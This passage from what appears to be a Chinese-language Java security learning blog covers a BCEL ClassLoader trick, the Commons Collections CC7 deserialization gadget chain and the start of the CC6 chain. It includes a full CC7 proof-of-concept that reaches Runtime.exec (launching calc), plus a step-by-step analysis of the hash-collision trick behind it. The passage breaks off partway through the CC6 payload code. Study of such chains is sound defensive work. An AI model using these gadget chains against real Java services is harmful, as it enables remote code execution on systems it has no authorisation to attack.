class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(evil.Hello.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630c1d45f09.png" alt="image-20240602163631813"></p><p>而BCEL ClassLoader用于加载这串特殊的“字节码”，并可以执行其中的代码：</p><p><img src="https://bu.dusays.com/2024/06/07/66630c1d90731.png" alt="image-20240602163658570"></p><p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的 TemplatesImpl 都出自于同一个第三方库，<code>Apache Xalan</code>。</p><p>在Java 8u251的更新中，这个ClassLoader被移除了，所以之后只能且用且珍惜了</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--CC7</title>
      <link href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/"/>
      <url>/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/</url>
      
        <content type="html"><![CDATA[<h1 id="java反序列化–CC7"><a href="#java反序列化–CC7" class="headerlink" title="java反序列化–CC7"></a>java反序列化–CC7</h1><p>利用条件 和CC5一样</p><p><strong>只有：3.1&gt;Common-Collection&lt;&#x3D;3.2.1&amp;&amp;Commons-Collections&#x3D;4.0</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//     基于Hashtable的利用链</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造核心利用代码</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用Hashtable来构造利用链调用LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="comment">//输出两个元素的hash值 这里可以不要</span></span><br><span class="line">        System.out.println(<span class="string">&quot;lazyMap1 hashcode:&quot;</span> + lazyMap1.hashCode());</span><br><span class="line">        System.out.println(<span class="string">&quot;lazyMap2 hashcode:&quot;</span> + lazyMap2.hashCode());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//iTransformers = transformers（反射）</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化  --&gt;  反序列化（hashtable）</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>嗯 </p><p>注意这里的 <strong>“yy” “zZ” 是不能更改的</strong> 是hash计算出的结果 我最开始以为是随便加的 更改了导致不能调出计算器 这个我们后面会说</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5ba35f6.png" alt="image-20240605211746861"></p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>从思路上来说，我个人觉得CC7利用链更像是从CC6利用链改造而来，只不过是CC7链没有使用HashSet，而是使用了<strong>Hashtable</strong>来构造新的利用链</p><ul><li><p>使用Transformer数组来构造利用代码，然后通过反射将transformers数组设置给ChaniedTransformer类的iTransformers属性，这一步和CC6利用链的构造思路上基本一致，没什么好说的。</p></li><li><p>在构造利用链时，CC7仍然使用了LazyMap来构造利用链，不同的是，CC7使用了新的链Hashtable来触发LazyMap利用链，最终执行核心利用代码。</p></li></ul><p>我们重点来看Hashtable是如何构造利用链的</p><p>先来看Hashtable序列化过程(writeObject)</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5b48d51.png" alt="image-20240605220125218"></p><p>Hashtable有一个<code>Entry&lt;?,?&gt;[]</code>类型的table属性，并且还是一个数组，用于存放元素（键值对)。Hashtable在序列化时会先把table数组的容量写入到序列化流中，再写入table数组中的元素个数，然后将table数组中的元素取出写入到序列化流中。</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5c237f7.png" alt="image-20240605223734999"></p><p>我们再回头看Hashtable的反序列化流程(readObject)：</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5c0e14c.png" alt="image-20240605233043585"></p><p>截不完 </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到：</p><p>Hashtable会先从反序列化流中读取table数组的容量和元素个数，并根据origlength 和elements 计算出table数组的length，再根据计算得到的length来创建table数组（origlength 和elements可以决定table数组的大小），然后从反序列化流中依次读取每个元素，然后调用reconstitutionPut方法将元素重新放入table数组（Hashtable的table属性），最终完成反序列化。</p><p>这里唯一不知道的就是<code>reconstitutionPut</code>方法 我们点进去看下</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5be793a.png" alt="image-20240605234112818"></p><p>它首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在tab数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到tabl数组中</p><p>而CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在<strong>判断重复元素的时候校验了两个元素的hash值是否一样</strong>，然后接着<strong>key会调用equals方法判断key是否重复时就会触发漏洞</strong></p><p>e.key.equals()调用了LazyMap的equals方法，但是LazyMap中并没有equals方法，实际上是调用了LazyMap的父类<code>AbstractMapDecorator</code>的equals方法，虽然AbstractMapDecorator是一个抽象类，但它实现了equals方法<br><img src="https://bu.dusays.com/2024/06/07/66630b5abb491.png" alt="image-20240607193313805"></p><p><img src="https://bu.dusays.com/2024/06/07/66630b5b7b77f.png" alt="image-20240607201041534"></p><p><strong>注</strong>：在添加第一个元素时并不会进入if语句调用equals方法进行判断，因此Hashtable中的元素至少为2个并且元素的hash值也必须相同的情况下才会调用equals方法，否则不会触发漏洞</p><p>因为其中 <strong>if ((e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key))</strong>, 存在着一个短路，就是如果 <strong>e.hash!&#x3D;hash</strong> 的话会直接返回 false, 就不会执行到我们想要的 <strong>e.key.equals</strong></p><p>好 我们再来看 e 是哪里来的，**e &#x3D; tab[index]**，我们一路追踪，发现 table 是从 readObject 跟进来的一个新 Entry</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5adfac2.png" alt="image-20240607194358833"></p><p><img src="https://bu.dusays.com/2024/06/07/66630b5c0cd48.png" alt="image-20240607195400775"></p><p>但是它并没有设置 hash 这种东西，所以我们只能从这里下手</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5b45e06.png" alt="image-20240607200300450"></p><p>这里有hash 可以来创建 它会根据我们传入的 map 的来创建一个和当前 map 存在相同 hash 的一个 entry</p><p>好 我们继续分析链子</p><p>回到<code>AbstractMapDecorator</code>的equals方法</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5b11b4f.png" alt="image-20240607201135075"></p><p><code>AbstractMapDecorator</code>类的equals方法只比较了这两个key的引用，如果不是同一对象会再次调用equals方法，map属性是通过LazyMap传递的，我们在构造利用链的时候，通过LazyMap的静态方法decorate将HashMap传给了map属性，因此这里会调用HashMap的equals方法。</p><p>但是HashMap中并没有找到一个名字为equals的成员方法，但是通过分析发现HashMap继承了AbstractMap抽象类，该类中有一个equals方法</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5d59d79.png" alt="image-20240607202001366"></p><p>抽象类AbstractMap的equals方法进行了更为复杂的判断：</p><ul><li><p>判断是否为同一对象</p></li><li><p>判断对象的运行类型</p></li><li><p>判断Map中元素的个数</p></li></ul><p>当以上三个判断都不满足的情况下，则进一步判断Map中的元素，也就是判断元素的key和value的内容是否相同，在value不为null的情况下，m会调用get方法获取key的内容，虽然对象o向上转型成Map类型，但是m对象本质上是一个LazyMap。因此<strong>m对象调用get</strong>方法时实际上是调用了LazyMap的get方法。<br><img src="https://bu.dusays.com/2024/06/07/66630b5b35f71.png" alt="image-20240607202627018"></p><p>调到了get的话链子其实就通了</p><p>调用流程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject-&gt;</span><br><span class="line">Hashtable.reconstitutionPut-&gt;</span><br><span class="line">AbstractMapDecorator.equals-&gt;</span><br><span class="line">AbstractMap.equals-&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>后续其实就一样了—沿着 LazyMap.get () 方法继续往下写的</p><h2 id="细节处理"><a href="#细节处理" class="headerlink" title="细节处理"></a>细节处理</h2><h3 id="为什么要hash值相同"><a href="#为什么要hash值相同" class="headerlink" title="为什么要hash值相同"></a>为什么要hash值相同</h3><p>其实几乎就是我们上面<code>注</code>里写的 一模一样 </p><p><strong>我这里复制下来 继续分析</strong></p><p>其中 <strong>if ((e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key))</strong>, 存在着一个短路，就是如果 <strong>e.hash!&#x3D;hash</strong> 的话会直接返回 false, 就不会执行到我们想要的 <strong>e.key.equals</strong></p><p>好 我们再来看 e 是哪里来的，**e &#x3D; tab[index]**，我们一路追踪，发现 table 是从 readObject 跟进来的一个新 Entry</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5adfac2.png" alt="image-20240607194358833"></p><p><img src="https://bu.dusays.com/2024/06/07/66630b5c0cd48.png" alt="image-20240607195400775"></p><p>但是它并没有设置 hash 这种东西，所以我们只能从这里下手</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5b45e06.png" alt="image-20240607200300450"></p><p>这里有hash 可以来创建 它会根据我们传入的 map 的来创建一个和当前 map 存在相同 hash 的一个 entry</p><p>我们在回头来看 <code>readObject</code></p><p><img src="https://bu.dusays.com/2024/06/07/66630b5d1e556.png" alt="image-20240607204126437"></p><p>重点看下这个for循环</p><p>他将 Hashtable 中的所有 map 都甩进了 reconstitutionPut 方法一次</p><p>我们需要甩两个 LazyMap 进 Hashtable 中，这样才能正常的进入我们想要的 equals 方法</p><p>这样就有了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>这里两个 map 的 key 值和 value 值不能同时相同，同时相同则无法进入 if 判断，因为在 readObject 中 element 计算会把两个 map 计算为只有一个 map，从而只进行一次循环</p></blockquote><p>在 Java 中 zZ 和 yy 的 hash 值相同，所以就拿这两个来进行比较</p><p>为什么这两个LazyMap的hash值是一样的？继续跟踪hash方法，发现当LazyMap调用hashCode方法，实际上会调用AbstractMap抽象类的hashCode方法</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5b99ffc.png" alt="image-20240607205106642"></p><p>AbstractMap抽象类的hashCode方法实际调用了HashMap中的元素（yy&#x3D;1）的hashCode方法，准确来说是Node节点的hashCode方法</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5c64072.png" alt="image-20240607205238318"></p><p>Node类调用了Objects类的hashCode静态方法计算key和value的hash值，然后再进行异或运算得到一个新的hash值</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5ccd87f.png" alt="image-20240607205607320"></p><p>继续跟进Objects类的hashCode静态方法</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5caf393.png" alt="image-20240607205741486"></p><p>到这我们基本可以知道，实际上底层调用了字符串“yy”的包装类String的hashCode方法，hashCode方法通过字符的<strong>ascii码值</strong>计算得到一个3872的hash值。</p><p>hash计算过程：</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5bb2a78.png" alt="image-20240607210154046"></p><p>第一次计算的时候val[i]的值是小写字母y，y的ascii码值就是121，h值为121。</p><p>第二次计算的时候val[i]的值是还是小写的字母y，h的值为3872&#x3D;31*121+121，最终得到hash值为3872。</p><p>然后返回到Node类中的hashCode方法，进行亦或运算得到一个3873新的hash值并返回到AbstractMap类的hashCode方法中，最终lazyMap1的hash值就是3873</p><p><strong>其他的同理</strong></p><p>所以hash(yy)&#x3D;hash(zZ)</p><p>lazyMap中元素的key值是经过精心构造的，其目的就是为了构造两个hash值相同的key，从而触发漏洞</p><p>其实key的字符串是可以替换的，但key中的字符串的hash值必须相同，例如把key的字符串改成以下值同样也可以触发漏洞</p><p>hash(Ea)&#x3D;hash(FB)</p><h3 id="第二个元素（yy-yy）从何而来"><a href="#第二个元素（yy-yy）从何而来" class="headerlink" title="第二个元素（yy&#x3D;yy）从何而来"></a>第二个元素（yy&#x3D;yy）从何而来</h3><p>我们可以看到Hashtable在添加第二个元素时，lazyMap2集合会“莫名其妙”添加一个元素（yy-&gt;yy）</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5c8178c.png" alt="image-20240607210948770"></p><p>这其实是Hashtable在调用put方法添加元素的时候会调用equals方法判断是否为同一对象，而在equals中会调用LazyMap的get方法添加一个元素（yy-&gt;yy）</p><p>例如Hashtable调用<strong>put方法</strong>添加第二个元素（lazyMap2，1）的时候，该方法内部会调用equals方法根据元素的key判断是否为同一元素</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5bd2e1a.png" alt="image-20240607211129313"></p><p>此时的key是lazyMap2对象，而lazyMap2实际上调用了AbstractMap抽象类的equals方法，equals方法内部会调用lazyMap2的get方法判断table数组中元素的key在lazyMap2是否已存在，如果不存在，transform会把当前传入的key返回作为value，然后lazyMap2会调用put方法把key和value（yy&#x3D;yy）添加到lazyMap2。</p><p>当在反序列化时，reconstitutionPut方法在还原table数组时会调用equals方法判断重复元素，由于AbstractMap抽象类的equals方法校验的时候更为严格，<strong>会判断Map中元素的个数</strong>，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞。</p><p>回到AbstractMap.equals</p><p><img src="https://bu.dusays.com/2024/06/07/66630b5d0b8df.png" alt="image-20240607211636416"></p><p>因此在构造CC7利用链的payload代码时，Hashtable在添加第二个元素后，lazyMap2需要调用remove方法删除元素（yy-&gt;yy）才能触发漏洞。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><p>好 CC7差不多就这样吧</p><p>其实整个CC链还是有点不熟 应该还要再花点时间来总结沉淀一下</p><p>会写一个总结的</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--CC6</title>
      <link href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/"/>
      <url>/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/</url>
      
        <content type="html"><![CDATA[<h1 id="java反序列化–CC6"><a href="#java反序列化–CC6" class="headerlink" title="java反序列化–CC6"></a>java反序列化–CC6</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>学完CC1后 我们发现CC1只能在8u71以前利用 那么 我们自然想知道CC链该怎么在<strong>8u71以后的利用方式</strong> 这就是CC6存在的意义</p><p>首先 8u71后为什么不能利用了：</p><p>主要原因是 <code>sun.reflect.annotation.AnnotationInvocationHandler.readObject</code> 的逻辑变化了</p><p>同样 我们也是通过照ysoserial中的代码进行学习</p><p><strong>利用条件：</strong></p><ul><li>Common-Collections 3.2.1</li><li>无 JDK 版本限制</li></ul><h2 id="CC6-demo分析"><a href="#CC6-demo分析" class="headerlink" title="CC6-demo分析"></a>CC6-demo分析</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()--&gt;</span><br><span class="line">java.util.HashMap.readObject()--&gt;</span><br><span class="line">java.util.HashMap.hash()--&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()--&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()--&gt;</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get()--&gt;</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform()--&gt;</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()--&gt;</span><br><span class="line">java.lang.reflect.Method.invoke()--&gt;</span><br><span class="line">java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p><strong>注意 这只是简化版的利用链 并不能直接运行 只是大致说下利用过程</strong></p><p>既然8u71后<code>sun.reflect.annotation.AnnotationInvocationHandler.readObject</code> 的逻辑变化了</p><p>那么这样我们就不能正常调用<code>TransformedMap</code>和<code>LazyMap.get()</code></p><p>所以简单来说，解决Java高版本利用问题，<strong>实际上就是在找上下文中是否还有其他调用 LazyMap.get() 的地方</strong></p><p>所以这条链子后面部分与CC1的LazyMap链的后面是一样的</p><p>所以我们重点关注这段代码：</p><p>从最开始到 org.apache.commons.collections.map.LazyMap.get()</p><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()--&gt;</span><br><span class="line">java.util.HashMap.readObject()--&gt;</span><br><span class="line">java.util.HashMap.hash()--&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()--&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()--&gt;</span><br></pre></td></tr></table></figure><p>为了解决调用LazyMap.get() 的问题：</p><p>我们找到的类是 <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> (<strong>TiedMapEntry</strong>)，在其getValue方法 中调用了 <code>this.map.get</code> ，而其hashCode方法调用了getValue方法</p><p>getValue:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630b1d2ba5d.png" alt="image-20240529224322853"></p><p>hashCode:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630b1d0cc48.png" alt="image-20240529224426668"></p><p>所以，想要触发LazyMap利用链，要找到就是哪里调用了 <code>TiedMapEntry.hashCode</code></p><p>ysoserial中，是利用 <code>java.util.HashSet.readObject</code> –&gt; <code>HashMap.put()</code> –&gt; <code>HashMap.hash(key)</code> –&gt; <code>TiedMapEntry.hashCode()</code> 。 </p><p>但实际上我发现，在 <code>java.util.HashMap.readObject</code> 中就可以找到 <code>HashMap.hash()</code> 的调用，去掉了最前面的两次调用（这不就是URLDNS的链吗）</p><p>我们两条链都看一下</p><h2 id="CC6链"><a href="#CC6链" class="headerlink" title="CC6链"></a>CC6链</h2><h3 id="HashMap链"><a href="#HashMap链" class="headerlink" title="HashMap链"></a>HashMap链</h3><h4 id="链子构造"><a href="#链子构造" class="headerlink" title="链子构造"></a>链子构造</h4><p>先看看<code>java.util.HashMap.readObject</code>里的调用</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1da7c9a.png" alt="image-20240529232022785"></p><p>点进去一看</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1d82f07.png" alt="image-20240529232122856"></p><p>就是HashMap.hash()</p><p>所以在HashMap的readObject方法中，调⽤到了 hash(key) ，⽽hash方法中，调用到了 key.hashCode() 。所以，<strong>我们只需要让这个key等于TiedMapEntry对象，即可连接上前面的分析过 程</strong>，构成⼀个完整的Gadget</p><p>首先，我们先把恶意LazyMap构造出来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span 